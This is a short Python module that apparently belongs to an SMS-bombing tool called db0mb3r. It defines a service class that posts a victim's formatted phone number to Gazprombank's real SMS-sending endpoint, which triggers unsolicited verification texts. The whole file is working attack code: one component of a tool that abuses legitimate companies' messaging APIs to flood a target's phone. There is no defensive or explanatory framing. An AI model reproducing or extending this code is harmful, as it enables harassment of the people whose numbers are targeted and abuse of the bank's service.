from db0mb3r.services.service import Service


class GazpromBank(Service):
    async def run(self):
        await self.post(
            "https://www.gazprombank.ru/rest/sms.send",
            json={
                "phone": self.format(self.formatted_phone, "+* (***) ***-**-**"),
                "type": "debit_card",
            },
        )
